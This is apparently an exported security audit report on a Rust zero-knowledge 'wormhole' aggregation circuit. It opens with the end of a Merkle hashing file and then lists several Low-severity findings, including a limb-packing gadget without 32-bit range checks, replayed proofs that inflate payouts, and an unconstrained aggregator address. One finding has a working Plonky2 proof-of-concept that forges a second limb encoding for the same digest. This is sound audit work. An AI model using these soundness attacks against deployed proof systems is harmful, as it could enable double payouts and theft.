     let mut data = Vec::with_capacity(CHILDREN_BYTES);
     for child in &sorted {
         data.extend_from_slice(child);
     }
 
     // Convert to felts using compact encoding (8 bytes/felt)
     // 128 bytes -> 16 felts
     let felts = qp_poseidon_core::serialization::bytes_to_felts_compact(&data);
 
     // Hash the felts
     qp_poseidon_core::hash_to_bytes(&felts)
 }
 
 /// Empty hash value (all zeros).
 pub fn empty_hash() -> Hash256 {
     [0u8; 32]
 }
 
 /// Convert a 32-byte hash to 4 field elements (digest format, 8 bytes/felt).
 pub fn hash_to_felts(hash: &Hash256) -> Digest {
     serialization::bytes_to_digest(hash)
 }
 
 /// Convert 4 field elements back to a 32-byte hash.
 pub fn felts_to_hash(felts: &Digest) -> Hash256 {
     serialization::digest_to_bytes(felts)
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
 
     #[test]
     fn test_empty_hash() {
         assert_eq!(empty_hash(), [0u8; 32]);
     }
 
     #[test]
     fn test_hash_node_is_deterministic() {
         let children = [[1u8; 32], [2u8; 32], [3u8; 32], [4u8; 32]];
         let hash1 = hash_node(&children);
         let hash2 = hash_node(&children);
         assert_eq!(hash1, hash2);
     }
 
     #[test]
     fn test_hash_node_is_order_independent() {
         // Because children are sorted, different input orders should give same hash
         let children1 = [[1u8; 32], [2u8; 32], [3u8; 32], [4u8; 32]];
         let children2 = [[4u8; 32], [2u8; 32], [1u8; 32], [3u8; 32]];
         assert_eq!(hash_node(&children1), hash_node(&children2));
     }
 
     #[test]
     fn test_hash_node_presorted_matches_hash_node() {
         // hash_node_presorted on sorted input should match hash_node
         let mut children = [[4u8; 32], [2u8; 32], [1u8; 32], [3u8; 32]];
         children.sort();
 
         let from_presorted = hash_node_presorted(&children);
         let from_hash_node = hash_node(&children);
         assert_eq!(from_presorted, from_hash_node);
     }
 
     #[test]
     fn test_hash_felts_roundtrip() {
         let original = [0xab; 32];
         let felts = hash_to_felts(&original);
         let recovered = felts_to_hash(&felts);
         assert_eq!(original, recovered);
     }
 
     #[test]
     fn test_insert_at_position() {
         let current = [0xcc; 32];
         let siblings = [[0x11; 32], [0x22; 32], [0x33; 32]];
 
         assert_eq!(
             insert_at_position(current, &siblings, 0),
             [current, siblings[0], siblings[1], siblings[2]]
         );
         assert_eq!(
             insert_at_position(current, &siblings, 1),
             [siblings[0], current, siblings[1], siblings[2]]
         );
         assert_eq!(
             insert_at_position(current, &siblings, 2),
             [siblings[0], siblings[1], current, siblings[2]]
         );
         assert_eq!(
             insert_at_position(current, &siblings, 3),
             [siblings[0], siblings[1], siblings[2], current]
         );
     }
 
     #[test]
     fn test_simple_proof_verification() {
         // Single leaf tree (depth 0 means just the leaf is the root)
         let leaf_hash = [0x42; 32];
         let proof = ZkMerkleProof {
             leaf_index: 0,
             siblings: vec![],
             positions: vec![],
             leaf_hash,
             root: leaf_hash,
         };
         assert!(proof.verify());
         assert!(proof.verify_with_positions());
     }
 
     #[test]
     fn test_depth_1_proof_verification() {
         // Tree with depth 1: root is hash of 4 leaves
         let leaf0 = [0x00; 32];
         let leaf1 = [0x11; 32];
         let leaf2 = [0x22; 32];
         let leaf3 = [0x33; 32];
 
         // Compute expected root
         let root = hash_node(&[leaf0, leaf1, leaf2, leaf3]);
 
         // Create proof for leaf0 using from_unsorted
         let proof = ZkMerkleProof::from_unsorted(0, vec![[leaf1, leaf2, leaf3]], leaf0, root);
 
         assert!(proof.verify());
         assert!(proof.verify_with_positions());
 
         // Create proof for leaf2 using from_unsorted
         let proof2 = ZkMerkleProof::from_unsorted(2, vec![[leaf0, leaf1, leaf3]], leaf2, root);
 
         assert!(proof2.verify());
         assert!(proof2.verify_with_positions());
     }
 
     #[test]
     fn test_from_unsorted_computes_correct_positions() {
         let leaf0 = [0x00; 32];
         let leaf1 = [0x11; 32];
         let leaf2 = [0x22; 32];
         let leaf3 = [0x33; 32];
 
         let root = hash_node(&[leaf0, leaf1, leaf2, leaf3]);
 
         // leaf0 is smallest, so position should be 0
         let proof0 = ZkMerkleProof::from_unsorted(0, vec![[leaf1, leaf2, leaf3]], leaf0, root);
         assert_eq!(proof0.positions[0], 0);
 
         // leaf3 is largest, so position should be 3
         let proof3 = ZkMerkleProof::from_unsorted(3, vec![[leaf0, leaf1, leaf2]], leaf3, root);
         assert_eq!(proof3.positions[0], 3);
     }
 
     #[test]
     fn test_invalid_proof_fails() {
         let leaf0 = [0x00; 32];
         let leaf1 = [0x11; 32];
         let leaf2 = [0x22; 32];
         let leaf3 = [0x33; 32];
 
         let root = hash_node(&[leaf0, leaf1, leaf2, leaf3]);
 
         // Wrong leaf hash should fail
         let bad_proof = ZkMerkleProof::from_unsorted(
             0,
             vec![[leaf1, leaf2, leaf3]],
             [0xff; 32], // wrong!
             root,
         );
 
         assert!(!bad_proof.verify());
     }
 
     #[test]
     fn test_oversized_proof_rejected() {
         // Create a proof with depth exceeding MAX_DEPTH
         let leaf_hash = [0x42; 32];
         let oversized_siblings: Vec<[Hash256; SIBLINGS_PER_LEVEL]> =
             (0..MAX_DEPTH + 1).map(|_| [[0u8; 32]; 3]).collect();
         let oversized_positions: Vec<u8> = vec![0; MAX_DEPTH + 1];
 
         let proof = ZkMerkleProof {
             leaf_index: 0,
             siblings: oversized_siblings,
             positions: oversized_positions,
             leaf_hash,
             root: [0xff; 32], // doesn't matter, should reject before hashing
         };
 
         // Both verify methods should reject oversized proofs
         assert!(!proof.verify());
         assert!(!proof.verify_with_positions());
     }
 
     #[test]
     fn test_max_depth_proof_accepted() {
         // Build a valid proof at exactly MAX_DEPTH to ensure the boundary is correct.
         // If a future change tightens the bound to >= MAX_DEPTH, this test will fail.
 
         // Start with a leaf and build up the tree level by level
         let leaf_hash = [0x42; 32];
         let mut current_hash = leaf_hash;
         let mut siblings_list = Vec::with_capacity(MAX_DEPTH);
         let mut positions_list = Vec::with_capacity(MAX_DEPTH);
 
         for level in 0..MAX_DEPTH {
             // Create 3 siblings that are distinct from current_hash
             // Use level to make each level unique
             let sib0 = {
                 let mut h = [0u8; 32];
                 h[0] = (level * 3) as u8;
                 h[1] = 0x01;
                 h
             };
             let sib1 = {
                 let mut h = [0u8; 32];
                 h[0] = (level * 3 + 1) as u8;
                 h[1] = 0x02;
                 h
             };
             let sib2 = {
                 let mut h = [0u8; 32];
                 h[0] = (level * 3 + 2) as u8;
                 h[1] = 0x03;
                 h
             };
 
             // Combine and sort to find position
             let mut all_four = [current_hash, sib0, sib1, sib2];
             all_four.sort();
             let pos = all_four.iter().position(|h| *h == current_hash).unwrap() as u8;
 
             // Extract sorted siblings (excluding current_hash)
             let mut sorted_sibs = [[0u8; 32]; 3];
             let mut sib_idx = 0;
             for (i, h) in all_four.iter().enumerate() {
                 if i as u8 != pos {
                     sorted_sibs[sib_idx] = *h;
                     sib_idx += 1;
                 }
             }
 
             siblings_list.push(sorted_sibs);
             positions_list.push(pos);
 
             // Compute parent hash for next level
             current_hash = hash_node_presorted(&all_four);
         }
 
         let root = current_hash;
 
         let proof = ZkMerkleProof {
             leaf_index: 0,
             siblings: siblings_list,
             positions: positions_list,
             leaf_hash,
             root,
         };
 
         // This must be true - a valid proof at exactly MAX_DEPTH should be accepted
         assert!(proof.verify_with_positions());
     }
 }
```

### Affected files
- `common/src/zk_merkle.rs`

### Validation output

```
[output truncated: 51 lines & 2.5029296875 KB skipped]
   Compiling qp-zk-circuits-common v3.0.0 (/repo/common)
   Compiling qp-wormhole-circuit v3.0.0 (/repo/wormhole/circuit)
   Compiling qp-wormhole-prover v3.0.0 (/repo/wormhole/prover)
   Compiling test-helpers v3.0.0 (/repo/wormhole/tests/test-helpers)
   Compiling qp-wormhole-aggregator v3.0.0 (/repo/wormhole/aggregator)
   Compiling qp-wormhole-circuit-builder v3.0.0 (/repo/wormhole/circuit-builder)
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 8.89s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)
error: test failed, to rerun pass `-p tests --test poc`
```

---

# Limb packing gadget lacks 32-bit range checks
**#96961**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `common/src/gadgets.rs`
#### Lines 142-173 — _pack_le_32x2 and digest4_from_le32x8 pack 32-bit limbs with no range_check on the limb targets_

```
/// Pack two 32-bit limbs (little-endian) into one felt: `lo + hi * 2^32`.
#[inline]
pub fn pack_le_32x2<F: RichField + Extendable<D>, const D: usize>(
    b: &mut CircuitBuilder<F, D>,
    lo: Target,
    hi: Target,
    two_pow_32_opt: Option<Target>,
) -> Target {
    // Reuse a provided 2^32 constant if the caller already has it, otherwise create it here.
    let two_pow_32 =
        two_pow_32_opt.unwrap_or_else(|| b.constant(F::from_canonical_u64(1u64 << 32)));

    let hi_shifted = b.mul(hi, two_pow_32);
    b.add(lo, hi_shifted)
}

/// Reconstruct 4 felts from 8 little-endian 32-bit limbs:
/// h0=(l0,l1), h1=(l2,l3), h2=(l4,l5), h3=(l6,l7) with `lo + hi*2^32`.
#[inline]
pub fn digest4_from_le32x8<F: RichField + Extendable<D>, const D: usize>(
    b: &mut CircuitBuilder<F, D>,
    limbs: [Target; 8],
    two_pow_32_opt: Option<Target>,
) -> [Target; 4] {
    let two_pow_32 =
        two_pow_32_opt.unwrap_or_else(|| b.constant(F::from_canonical_u64(1u64 << 32)));
    [
        pack_le_32x2(b, limbs[0], limbs[1], Some(two_pow_32)),
        pack_le_32x2(b, limbs[2], limbs[3], Some(two_pow_32)),
        pack_le_32x2(b, limbs[4], limbs[5], Some(two_pow_32)),
        pack_le_32x2(b, limbs[6], limbs[7], Some(two_pow_32)),
    ]
```

## Description

The shared `pack_le_32x2` gadget computes `lo + hi * 2^32` and `digest4_from_le32x8` reconstructs a 4-felt digest from 8 limbs using it, but neither function range-constrains `lo`/`hi` (or the eight input limbs) to 32 bits. The doc comments claim the inputs are "32-bit limbs", yet nothing in the circuit enforces that. Because these are `pub` functions in the reusable `zk_circuits_common::gadgets` module, a downstream circuit that passes witness-controlled limbs without a preceding `range_check(_, 32)` gets a non-injective packing: a malicious prover can move value across the boundary (e.g. `lo' = lo + 2^32`, `hi' = hi - 1`) to produce the same packed felt, or push limbs large enough to wrap modulo the Goldilocks prime, so distinct limb vectors collapse to identical digest felts. This breaks the binding between the byte/limb representation and the reconstructed digest that a consumer would rely on for equality or membership checks.

## Root cause

`pack_le_32x2` and `digest4_from_le32x8` perform `lo + hi*2^32` reconstruction without constraining the limbs to 32 bits, so the packing is non-injective when fed unconstrained witness limbs.

## Impact

A circuit that reconstructs a digest from unconstrained limbs via these helpers and then exposes the raw limbs as public inputs (or compares the packed digest in-circuit) can be made to accept multiple distinct limb encodings for one logical digest, or a single value under multiple encodings, defeating the intended canonical-encoding/injectivity guarantee. The concrete effect is a soundness weakening (digest aliasing) for any downstream consumer of these shared gadgets.

## Proof of concept

### Test case

```
use circuit_builder as _;
use qp_wormhole_inputs as _;
use wormhole_aggregator as _;
use wormhole_circuit as _;
use wormhole_prover as _;
use wormhole_verifier as _;

use plonky2::{
    field::types::Field,
    iop::{target::Target, witness::{PartialWitness, WitnessWrite}},
    plonk::{
        circuit_builder::CircuitBuilder,
        circuit_data::{CircuitConfig, CircuitData},
    },
};
use zk_circuits_common::{
    circuit::{C, D, F},
    gadgets::digest4_from_le32x8,
};

const LIMB_COUNT: usize = 8;
const DIGEST_COUNT: usize = 4;

fn build_digest_aliasing_circuit() -> (CircuitData<F, C, D>, [Target; LIMB_COUNT]) {
    let config = CircuitConfig::standard_recursion_config();
    let mut builder = CircuitBuilder::<F, D>::new(config);

    let limb_targets_vec = builder.add_virtual_targets(LIMB_COUNT);
    let limb_targets: [Target; LIMB_COUNT] = limb_targets_vec
        .clone()
        .try_into()
        .expect("exactly 8 limb targets");

    let digest_targets = digest4_from_le32x8(&mut builder, limb_targets, None);

    builder.register_public_inputs(&limb_targets_vec);
    builder.register_public_inputs(&digest_targets);

    (builder.build::<C>(), limb_targets)
}

fn prove_digest_alias(
    circuit: &CircuitData<F, C, D>,
    limb_targets: &[Target; LIMB_COUNT],
    limbs: [u64; LIMB_COUNT],
) -> plonky2::plonk::proof::ProofWithPublicInputs<F, C, D> {
    let mut pw = PartialWitness::new();
    for (target, limb) in limb_targets.iter().zip(limbs) {
        pw.set_target(*target, F::from_canonical_u64(limb))
            .expect("set limb witness");
    }
    circuit.prove(pw).expect("proof generation should succeed")
}

#[test]
fn digest4_from_le32x8_accepts_two_public_limb_encodings_for_one_digest() {
    let (circuit, limb_targets) = build_digest_aliasing_circuit();

    let canonical_limbs = [7, 11, 13, 17, 19, 23, 29, 31];
    let aliased_limbs = [
        (1u64 << 32) + canonical_limbs[0],
        canonical_limbs[1] - 1,
        canonical_limbs[2],
        canonical_limbs[3],
        canonical_limbs[4],
        canonical_limbs[5],
        canonical_limbs[6],
        canonical_limbs[7],
    ];

    assert_ne!(canonical_limbs, aliased_limbs, "the raw limb encodings must differ");

    let canonical_proof = prove_digest_alias(&circuit, &limb_targets, canonical_limbs);
    let aliased_proof = prove_digest_alias(&circuit, &limb_targets, aliased_limbs);

    circuit
        .verify(canonical_proof.clone())
        .expect("canonical proof should verify");
    circuit
        .verify(aliased_proof.clone())
        .expect("aliased proof should also verify without limb range checks");

    let canonical_public_limbs = &canonical_proof.public_inputs[..LIMB_COUNT];
    let aliased_public_limbs = &aliased_proof.public_inputs[..LIMB_COUNT];
    let canonical_digest = &canonical_proof.public_inputs[LIMB_COUNT..LIMB_COUNT + DIGEST_COUNT];
    let aliased_digest = &aliased_proof.public_inputs[LIMB_COUNT..LIMB_COUNT + DIGEST_COUNT];

    assert_ne!(
        canonical_public_limbs, aliased_public_limbs,
        "the downstream verifier sees two distinct public limb vectors"
    );
    assert_eq!(
        canonical_digest, aliased_digest,
        "the vulnerable gadget packs both limb vectors into the same digest felts"
    );
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc
```

### Output

```
[output truncated: 27 lines & 0.8525390625 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.36s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

PoC demonstrates the latent shared-gadget defect, not an active in-repo exploit path: repository grep showed no current callers of `pack_le_32x2`/`digest4_from_le32x8` outside `common/src/gadgets.rs`. The passing test builds a minimal downstream-style Plonky2 circuit that calls the real vulnerable `digest4_from_le32x8` helper, exposes both the raw 8 limbs and reconstructed 4-felt digest as public inputs, and proves two distinct public limb vectors that both verify to the same packed digest. It does not model a specific downstream application’s equality or membership check beyond that binding break.

### Validation reasoning

PoC validation command completed successfully.

---

# Duplicate Proofs Inflate Payouts
**#96983**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/aggregator.rs`
#### Lines 284-286 — _Private-batch admission enqueues length-shaped leaf proofs without duplicate-nullifier checks._

```
    fn push_proof(&mut self, proof: Proof) -> Result<()> {
        ensure_proof_public_input_len(&proof, self.expected_leaf_pi_len, "leaf proof")?;
        self.buf.push(proof)
```

### `wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs` (2 locations)
#### Lines 287-312 — _Exit-account aggregation sums all matching output amounts before zeroing duplicate exit-account slots._

```
        // Sum all matching amounts across all 2*N outputs
        let mut acc = zero;
        for j in 0..num_exit_slots {
            let j_proof_idx = j / 2;
            let j_output_idx = j % 2;
            let (exit_j, amount_j) = get_exit_and_amount(j_proof_idx, j_output_idx);

            let matches = bytes_digest_eq(builder, exit_j, exit_slot);
            let conditional_amount = builder.select(matches, amount_j, zero);
            acc = builder.add(acc, conditional_amount);
        }

        // Zero duplicates so they look like dummy/unused slots
        let final_sum = builder.select(is_duplicate, zero, acc);
        let final_exit = [
            builder.select(is_duplicate, zero, exit_slot[0]),
            builder.select(is_duplicate, zero, exit_slot[1]),
            builder.select(is_duplicate, zero, exit_slot[2]),
            builder.select(is_duplicate, zero, exit_slot[3]),
        ];

        // Range check final sum to 32 bits (u32::MAX > the max possible sum on our chain)
        builder.range_check(final_sum, 32);

        output_pis.push(final_sum);
        output_pis.extend_from_slice(&final_exit);
```

⋯
#### Lines 319-332 — _Nullifiers are forwarded slot-by-slot with no uniqueness constraint._

```
    for i in 0..n_leaf {
        let pis_i = leaf_pi_targets[i];
        let real_null_i = limbs4_at_offset::<LEAF_PI_LEN, NULLIFIER_START>(pis_i, 0);
        let dummy_null_i =
            hash_dummy_nullifier_pre_image(builder, targets.dummy_nullifier_pre_images[i]);
        let is_dummy_i = is_dummy_flags[i];

        // output = is_dummy ? hash(dummy_nullifier_pre_image[i]) : real_nullifier[i]
        output_pis.extend_from_slice(&[
            builder.select(is_dummy_i, dummy_null_i[0], real_null_i[0]),
            builder.select(is_dummy_i, dummy_null_i[1], real_null_i[1]),
            builder.select(is_dummy_i, dummy_null_i[2], real_null_i[2]),
            builder.select(is_dummy_i, dummy_null_i[3], real_null_i[3]),
        ]);
```

### `wormhole/aggregator/src/public_batch/circuit/circuit_logic.rs`
#### Lines 267-293 — _Public-batch aggregation forwards inner exit slots and nullifiers without cross-batch uniqueness checks._

```
    // 5) Forward exit slots from all private-batch proofs, zeroing dummy inners'
    //    slots. Genuine dummies already carry zero slots; the select makes that
    //    an enforced invariant rather than a construction detail.
    let exit_slots_start = pbc::private_batch_exit_slots_start();
    for (i, pis_i) in private_batch_pi_targets.iter().take(n_inner).enumerate() {
        for slot_idx in 0..private_batch_exit_slots_per_proof {
            let slot_base = exit_slots_start + slot_idx * pbc::PRIVATE_BATCH_EXIT_SLOT_LEN;
            // [sum(1), exit_account(4)]
            for j in 0..pbc::PRIVATE_BATCH_EXIT_SLOT_LEN {
                let forwarded = builder.select(is_dummy_flags[i], zero, pis_i[slot_base + j]);
                output_pis.push(forwarded);
            }
        }
    }

    // 6) Forward nullifiers from all private-batch proofs, zeroing dummy inners'
    //    nullifiers. This lets the chain skip them (no storage bloat) and lets a
    //    single dummy proof template fill several slots without collisions. Real
    //    nullifiers are hash outputs and are never zero.
    let nullifiers_start = pbc::private_batch_nullifiers_start(private_batch_num_leaves);
    for (i, pis_i) in private_batch_pi_targets.iter().take(n_inner).enumerate() {
        for n_idx in 0..private_batch_nullifiers_per_proof {
            let base = nullifiers_start + n_idx * 4;
            for j in 0..4 {
                let forwarded = builder.select(is_dummy_flags[i], zero, pis_i[base + j]);
                output_pis.push(forwarded);
            }
```

### `wormhole/inputs/src/lib.rs` (2 locations)
#### Lines 170-180 — _The leaf public-input model treats the nullifier as the double-spend prevention value for a transfer._

```
    /// The nullifier (prevents double-spending).
    pub nullifier: BytesDigest,
    /// The address of the first exit account (spend destination).
    pub exit_account_1: BytesDigest,
    /// The address of the second exit account (change destination).
    /// Set to all zeros if only one output is needed.
    pub exit_account_2: BytesDigest,
    /// The hash of the block header.
    pub block_hash: BytesDigest,
    /// The block number, parsed from the block header.
    pub block_number: u32,
```

⋯
#### Lines 217-220 — _Private-batch public inputs expose payout groups and a vector of nullifiers that downstream consumers rely on._

```
    /// The set of exit accounts and their summed output amounts.
    pub account_data: Vec<PublicInputsByAccount>,
    /// The nullifiers of each individual transfer proof.
    pub nullifiers: Vec<BytesDigest>,
```

## Description

The aggregation buffer accepts the same leaf proof more than once and the private-batch circuit does not enforce nullifier uniqueness across leaf slots. During aggregation, exit-account deduplication sums amounts across every matching output slot, so replaying the same valid leaf proof in multiple slots multiplies that exit account’s summed payout. The nullifier section then forwards one nullifier per slot, preserving the duplicated nullifier instead of rejecting it or zeroing the duplicate contribution. Public-batch aggregation likewise forwards all inner exit slots and nullifiers without enforcing uniqueness across private batches. This permits a cryptographically valid aggregate proof whose public inputs count the same underlying transfer multiple times; downstream consumers must detect and reject intra-proof duplicate nullifiers themselves or they can overpay relative to the set of unique spends.

## Root cause

The batch circuits deduplicate exit accounts but never bind that payout aggregation to unique nullifiers, and `push_proof` performs no duplicate-nullifier admission check.

## Impact

A malicious submitter can cause aggregate artifacts to overstate unique payout amounts by replaying the same proof in multiple slots. If a downstream settlement or accounting consumer trusts the aggregate payout sums without an independent duplicate-nullifier check inside the same proof, it can pay the same spend more than once; if it does check duplicates, the attacker can still use duplicate proofs to make otherwise valid-looking batches unusable.

---

# Aggregator address forwarded as unconstrained public input
**#97013**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/public_batch/circuit/circuit_logic.rs` (2 locations)
#### Lines 81-89 — _unconstrained aggregator_address witness allocation_

```
        let aggregator_address: [Target; AGGREGATOR_ADDRESS_LEN] = builder
            .add_virtual_targets(AGGREGATOR_ADDRESS_LEN)
            .try_into()
            .unwrap();

        let targets = PublicBatchCircuitTargets {
            private_batch_proofs,
            aggregator_address,
        };
```

⋯
#### Lines 231-232 — _forwarded verbatim into public inputs_

```
    // 1) Aggregator address (witness target, 4 felts, 8 bytes/felt)
    output_pis.extend_from_slice(&targets.aggregator_address);
```

## Description

The public-batch circuit allocates `aggregator_address` as `AGGREGATOR_ADDRESS_LEN` virtual targets and forwards them verbatim into the registered public inputs without any constraint. There is no range check, no byte-decomposition check, and no binding of these felts to any inner proof or committed value. The prover of the public-batch proof (the delegated aggregator) can therefore place any field-element values it wants into the `aggregator_address` output slot, which downstream consumers reconstruct as a 32-byte hash-derived account (8 bytes per felt) for attribution/payout.

## Root cause

`aggregator_address` is a free witness registered as a public input with no range/canonicalization constraint, deferring all validation of the emitted account felts to downstream consumers.

## Impact

A delegated aggregator can set the published `aggregator_address` to any value it chooses, including values whose byte interpretation is ambiguous relative to the intended 8-byte-per-felt decoding. Because the address only attributes the aggregator's own output segment, the effect is limited to self-declared attribution and depends entirely on downstream canonical-range validation of the emitted felts.

---

# Duplicated public-batch layout constants across crates
**#97014**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/public_batch/circuit/constants.rs` (2 locations)
#### Lines 9-17 — _Layout comment says [sum(1), exit(8)]_

```
// Private-batch output layout (per proof):
// [ num_exit_slots(1),
//   asset_id(1),
//   volume_fee_bps(1),
//   block_hash(4),
//   block_number(1),
//   [sum(1), exit(8)] * (2 * private_batch_num_leaves),
//   nullifier(4) * private_batch_num_leaves,
//   padding ... ]
```

⋯
#### Lines 59-121 — _Public-batch PI layout header offsets and const fns defined here_ — _Layout comment says [sum(1), exit(4)] for the same slot structure_

```
// -----------------------------------------------------------------------------
// Public-batch aggregated proof PI layout (output of public-batch circuit)
// -----------------------------------------------------------------------------
//
// [ aggregator_address(4),  <-- 4 felts (8 bytes/felt) for hash-derived accounts
//   asset_id(1),
//   volume_fee_bps(1),
//   block_hash(4),
//   block_number(1),
//   total_exit_slots(1),
//   [sum(1), exit(4)] * (n_inner * 2 * private_batch_num_leaves),
//   nullifier(4) * (n_inner * private_batch_num_leaves)
// ]
// -----------------------------------------------------------------------------

pub const AGGREGATOR_ADDRESS_LEN: usize = 4; // 4 felts (8 bytes/felt) for hash-derived accounts
pub const AGGREGATOR_ADDRESS_START: usize = 0;
pub const ASSET_ID_START: usize = AGGREGATOR_ADDRESS_START + AGGREGATOR_ADDRESS_LEN; // 4
pub const VOLUME_FEE_BPS_START: usize = ASSET_ID_START + 1; // 5
pub const BLOCK_HASH_START: usize = VOLUME_FEE_BPS_START + 1; // 6, 4 felts
pub const BLOCK_NUMBER_START: usize = BLOCK_HASH_START + 4; // 10
pub const TOTAL_EXIT_SLOTS_START: usize = BLOCK_NUMBER_START + 1; // 11

pub const PUBLIC_BATCH_HEADER_LEN: usize = TOTAL_EXIT_SLOTS_START + 1; // 12 = 4 + 1 + 1 + 4 + 1 + 1

#[inline]
pub const fn public_batch_total_exit_slots(
    n_inner: usize,
    private_batch_num_leaves: usize,
) -> usize {
    n_inner * private_batch_exit_slots_count(private_batch_num_leaves)
}

#[inline]
pub const fn public_batch_total_nullifiers(
    n_inner: usize,
    private_batch_num_leaves: usize,
) -> usize {
    n_inner * private_batch_nullifiers_count(private_batch_num_leaves)
}

#[inline]
pub const fn public_batch_exit_slots_start() -> usize {
    PUBLIC_BATCH_HEADER_LEN
}

#[inline]
pub const fn public_batch_nullifiers_start(
    n_inner: usize,
    private_batch_num_leaves: usize,
) -> usize {
    PUBLIC_BATCH_HEADER_LEN
        + public_batch_total_exit_slots(n_inner, private_batch_num_leaves)
            * PRIVATE_BATCH_EXIT_SLOT_LEN
}

#[inline]
pub const fn public_batch_pi_len(n_inner: usize, private_batch_num_leaves: usize) -> usize {
    PUBLIC_BATCH_HEADER_LEN
        + public_batch_total_exit_slots(n_inner, private_batch_num_leaves)
            * PRIVATE_BATCH_EXIT_SLOT_LEN
        + public_batch_total_nullifiers(n_inner, private_batch_num_leaves) * 4
}
```

### `wormhole/inputs/src/lib.rs`
#### Lines 242-264 — _Independent hand-copied mirror of the layout constants in the parser crate_

```
/// Public-batch PI layout constants (mirrors `public_batch/circuit/constants.rs`).
pub mod public_batch_pi {
    pub const AGGREGATOR_ADDRESS_LEN: usize = 4;
    pub const HEADER_LEN: usize = 12; // 4 + 1 + 1 + 4 + 1 + 1
    pub const EXIT_SLOT_LEN: usize = 5; // sum(1) + exit_account(4)

    #[inline]
    pub const fn exit_slots_per_inner(num_leaf_proofs: usize) -> usize {
        num_leaf_proofs * 2
    }

    #[inline]
    pub const fn nullifiers_per_inner(num_leaf_proofs: usize) -> usize {
        num_leaf_proofs
    }

    #[inline]
    pub const fn pi_len(num_private_batch_proofs: usize, num_leaf_proofs: usize) -> usize {
        HEADER_LEN
            + num_private_batch_proofs * exit_slots_per_inner(num_leaf_proofs) * EXIT_SLOT_LEN
            + num_private_batch_proofs * nullifiers_per_inner(num_leaf_proofs) * 4
    }
}
```

## Description

The public-batch aggregated-proof public-input layout is defined by this constants file (`AGGREGATOR_ADDRESS_START`..`TOTAL_EXIT_SLOTS_START`, `PUBLIC_BATCH_HEADER_LEN`, and the `public_batch_*` const fns) and consumed by the circuit producer `build_public_batch_constraints`. The verifier-side parser `PublicBatchPublicInputs::try_from_u64_slice` in `qp_wormhole_inputs` does not import these constants; instead it re-declares an independent copy in a `public_batch_pi` module whose own comment states it "mirrors `public_batch/circuit/constants.rs`" (`HEADER_LEN=12`, `EXIT_SLOT_LEN=5`, `AGGREGATOR_ADDRESS_LEN=4`). The two hand-maintained copies of the same serialization layout currently agree, but there is no shared source of truth or compile-time cross-check binding them. The file's own layout doc-comments are already internally inconsistent (`[sum(1), exit(8)]` on line 15 versus `[sum(1), exit(4)]` on line 69, while `PRIVATE_BATCH_EXIT_SLOT_LEN` is 5 = sum(1)+exit(4)), evidence that these hand-copied layout descriptions are error-prone.

## Root cause

The public-batch public-input layout is declared in two independent locations (`public_batch/circuit/constants.rs` and `qp_wormhole_inputs::public_batch_pi`) with no shared definition or compile-time equality check, so producer and consumer layouts can drift.

## Impact

If the circuit layout is ever changed (e.g. adding a header field or altering a slot width) without updating the mirrored parser constants in lockstep, the off-chain/on-chain verifier can misinterpret payout amounts, exit accounts, and nullifiers of a public-batch proof. The parser's exact-length check catches size-changing drifts, but a length-preserving reordering would misparse silently.

## Proof of concept

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc
```

### Invalid reason

Not exploitable on the current code through public entry points. I verified the producer `build_public_batch_constraints` emits the public-batch layout from `wormhole/aggregator/src/public_batch/circuit/constants.rs` and the verifier-side parser `PublicBatchPublicInputs::try_from_u64_slice` consumes the same numeric layout from its mirror in `wormhole/inputs/src/lib.rs`: both currently use aggregator_address(4), header length 12, exit slots of 5 felts, and 4-felt nullifiers. The parser also rejects size-changing drift with `pis.len() == pi_len(...)` and `total_exit_slots == expected`. The reported impact requires a hypothetical future producer/parser drift, especially a length-preserving reordering, but no such drift exists in the shipped code I read this session, so there is no native runtime exploit to demonstrate today.

### Validation reasoning

Not exploitable on the current code through public entry points. I verified the producer `build_public_batch_constraints` emits the public-batch layout from `wormhole/aggregator/src/public_batch/circuit/constants.rs` and the verifier-side parser `PublicBatchPublicInputs::try_from_u64_slice` consumes the same numeric layout from its mirror in `wormhole/inputs/src/lib.rs`: both currently use aggregator_address(4), header length 12, exit slots of 5 felts, and 4-felt nullifiers. The parser also rejects size-changing drift with `pis.len() == pi_len(...)` and `total_exit_slots == expected`. The reported impact requires a hypothetical future producer/parser drift, especially a length-preserving reordering, but no such drift exists in the shipped code I read this session, so there is no native runtime exploit to demonstrate today.

---

# Non-atomic artifact generation leaves inconsistent binaries
**#97020**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `wormhole/circuit-builder/src/lib.rs` (2 locations)
#### Lines 34-35 — _create_dir_all does not clear pre-existing directory contents_

```
    let output_path = output_dir.as_ref();
    create_dir_all(output_path)?;
```

⋯
#### Lines 95-127 — _Doc claims no partial artifact generation; actual multi-stage non-atomic sequence with config.json saved last_

```
/// # Errors
/// Returns an error if proof counts are invalid (zero or exceed maximum bounds).
/// Validation happens before any files are written to avoid partial artifact generation.
pub fn generate_all_circuit_binaries<P: AsRef<Path>>(
    output_dir: P,
    include_prover: bool,
    num_leaf_proofs: usize,
    num_private_batch_proofs: Option<usize>,
) -> Result<()> {
    // Validate proof counts upfront before any writes to avoid partial artifact generation
